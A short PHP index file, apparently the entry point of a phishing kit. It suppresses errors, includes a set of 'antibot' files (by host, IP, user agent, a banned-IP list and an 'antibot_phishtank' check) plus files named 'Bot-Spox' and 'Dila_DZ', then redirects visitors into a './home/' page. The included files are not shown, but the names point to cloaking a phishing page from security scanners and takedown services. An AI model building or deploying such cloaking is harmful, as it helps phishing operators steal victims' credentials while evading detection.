<?php
@error_reporting(0);
ini_set( "display_errors", 0);  
include'./home/bots/Bot-Crawler.php';
include'./home/bots/Bot-Spox.php';
include'./home/bots/Dila_DZ.php';
include './home/bots/bite.php';
include './home/bots/./home/bots1.php';
include './home/bots/./home/bots2.php';
include './home/bots/./home/bots4.php';
include './home/bots/./home/bots5.php';
include './home/bots/banned-ip.php';
    include "./home/bots/antibot_host.php";
    include "./home/bots/antibot_ip.php";
    include "./home/bots/antibot_phishtank.php";
    include "./home/bots/antibot_userAgent.php";
header("Location:./home/");
?>
